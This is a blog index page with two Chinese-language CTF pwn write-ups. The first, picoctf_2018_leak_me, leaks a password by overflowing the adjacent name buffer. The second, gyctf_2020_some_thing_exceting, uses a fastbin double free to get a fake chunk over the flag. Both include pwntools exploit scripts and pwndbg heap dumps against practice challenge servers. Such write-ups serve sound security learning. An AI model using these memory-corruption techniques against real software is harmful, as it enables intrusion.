<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/shuwen.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/shuwen.jpg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="做有意思的事，有意思地做事">
<meta property="og:type" content="website">
<meta property="og:title" content="Shuwen&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="Shuwen&#39;s blog">
<meta property="og:description" content="做有意思的事，有意思地做事">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Shuwen">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yoursite.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Shuwen's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Shuwen's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">生活 & 学习</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/05/01/23-54/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/01/23-54/" class="post-title-link" itemprop="url">picoctf_2018_leak_me详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-01 23:54:51" itemprop="dateCreated datePublished" datetime="2021-05-01T23:54:51+08:00">2021-05-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-02 00:06:07" itemprop="dateModified" datetime="2021-05-02T00:06:07+08:00">2021-05-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>虽然很简单，<del>但好像第一次碰见这样的题</del>，所以记录下。</p>
</blockquote>
<h3 id="反汇编问题"><a href="#反汇编问题" class="headerlink" title="反汇编问题"></a>反汇编问题</h3><p>问题：main函数f5的时候报如下错误</p>
<p><img src="/2021/05/01/23-54/image-20210501234336628.png" alt="image-20210501234336628"></p>
<p>解决：</p>
<ol>
<li><p>找到报错的地址：0x8048705【按g输入地址即可】</p>
<p><img src="/2021/05/01/23-54/image-20210501234523311.png" alt="image-20210501234523311"></p>
</li>
<li><p>双击函数，然后f5</p>
<p><img src="/2021/05/01/23-54/image-20210501234614572.png" alt="image-20210501234614572"></p>
</li>
<li><p>然后就可以正常了</p>
</li>
</ol>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li>输入name</li>
<li>打印name</li>
<li>输入password</li>
<li>比较输入password和password</li>
<li>相同打印flag</li>
</ol>
<p><img src="/2021/05/01/23-54/image-20210501234815805.png" alt="image-20210501234815805"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于name和password是紧挨着的，而且差距0x100。</p>
<p>如果name的长度为0x100，那么puts输出name的时候，就会把password一起带出来了。</p>
<p>而且name的最大长度可以达到0x100，故首先令name=0x100，即可泄露password，接着就可以得到flag了。</p>
<p><img src="/2021/05/01/23-54/image-20210501234915134.png" alt="image-20210501234915134"></p>
<h4 id="获得password"><a href="#获得password" class="headerlink" title="获得password"></a>获得password</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26105)</span><br><span class="line">p.recvuntil(&quot;name?&quot;)</span><br><span class="line">p.sendline(&quot;a&quot;*0x100)</span><br><span class="line"># password &#x3D; &quot;a_reAllY_s3cuRe_p4s$word_f85406&quot;</span><br><span class="line"># p.sendline(password)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406</span><br><span class="line"></span><br><span class="line">Incorrect Password!</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26105</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># password = "a_reAllY_s3cuRe_p4s$word_f85406"</span></span><br><span class="line"><span class="comment"># p.sendline(password)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="PicoCTF_2018_leak-me">附件</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/05/01/21-48/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/01/21-48/" class="post-title-link" itemprop="url">gyctf_2020_some_thing_exceting详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-01 21:48:15" itemprop="dateCreated datePublished" datetime="2021-05-01T21:48:15+08:00">2021-05-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-02 00:05:16" itemprop="dateModified" datetime="2021-05-02T00:05:16+08:00">2021-05-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>还是高校战役的题，并且以前做过，，，，<del>但当时tcl，复现也不会，虽然现在也很菜</del></p>
<p>这里再重新写篇文章，记录下。</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/01/21-48/image-20210501212850010.png" alt="image-20210501212850010"></p>
<h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>程序最开始进入了init函数</p>
<blockquote>
<p>init函数首先将flag读入了内存。</p>
<p>接着又将内存flag的数据读入了s，在0x6020a8中。</p>
<p>由于0x6020a0处设置了0x60，可以将fake chunk申请到这里，再读取块数据，即可得到flag</p>
</blockquote>
<p><img src="/2021/05/01/21-48/image-20210501213125204.png" alt="image-20210501213125204"></p>
<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ol>
<li>create：创建一个指针chunk，里面存放了ba和na两个块的地址；创建ba和na，大小为0~0x70，fastbin大小内。</li>
<li>delete：free块，但是没有清零，可以double free，获得一定的地址读写能力</li>
<li>view：根据idx打印内容。</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>两次create</li>
<li>free(0) -&gt; free(1) -&gt; free(0)</li>
<li>重新申请create2，此时修改2的内容，由于0和2是同一个地址，修改2，修改了0的内容，重新申请4的时候，就可以申请到想要的地址</li>
<li>修改2的内容为0x6020a0-0x8</li>
<li>create3，create4</li>
<li>4即申请到了0x6020a0的位置，打印其内容即为flag</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-保护"><a href="#0-保护" class="headerlink" title="0.保护"></a>0.保护</h4><blockquote>
<p>没开pie</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec gyctf_2020_some_thing_exceting </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_some_thing_exceting&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h4 id="1-两次创建"><a href="#1-两次创建" class="headerlink" title="1.两次创建"></a>1.两次创建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf74000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf74230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75240</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf752c0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75320</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75340</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf753a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaa'</span>,<span class="number">0x50</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaa'</span>,<span class="number">0x50</span>,<span class="string">'bbbb'</span>)</span><br></pre></td></tr></table></figure>
<h4 id="2-double-free"><a href="#2-double-free" class="headerlink" title="2.double free"></a>2.double free</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ac000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ac230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad240</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x10ad320</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ad260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad2c0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad3a0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad320</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x10ad240</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad340</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad2c0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad3a0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad340</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ad400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x10ad240 —▸ 0x10ad320 ◂— 0x10ad240</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x10ad2c0 —▸ 0x10ad3a0 —▸ 0x10ad340 ◂— 0x10ad2c0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h4 id="3-create-3，并修改fd为fake-chunk"><a href="#3-create-3，并修改fd为fake-chunk" class="headerlink" title="3.create 3，并修改fd为fake chunk"></a>3.create 3，并修改fd为fake chunk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce5000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce5230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6240</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0xce62d0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce6260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce62c0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x602098</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6320</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0xce6240</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6340</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0xce62c0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce63a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce6400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0xce6320 —▸ 0xce6240 —▸ 0xce62d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0xce6340 —▸ 0xce62c0 —▸ 0x602098 ◂— &#39;flag&#123;winter_excited&#125;&#39;</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk &#x3D; 0x6020a0 - 0x8</span><br><span class="line">create(0x50,p64(fake_chunk),0x50,p64(fake_chunk))#2</span><br></pre></td></tr></table></figure>
<h4 id="4-create4，create5（申请到fake地址）"><a href="#4-create4，create5（申请到fake地址）" class="headerlink" title="4.create4，create5（申请到fake地址）"></a>4.create4，create5（申请到fake地址）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x652000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x652230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653240</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6532c0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653320</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653340</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6533a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653400</span><br><span class="line">Size: 0x81</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653480</span><br><span class="line">Size: 0x1fb81</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x6532d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x6e69777b67616c66 (&#39;flag&#123;win&#39;)</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
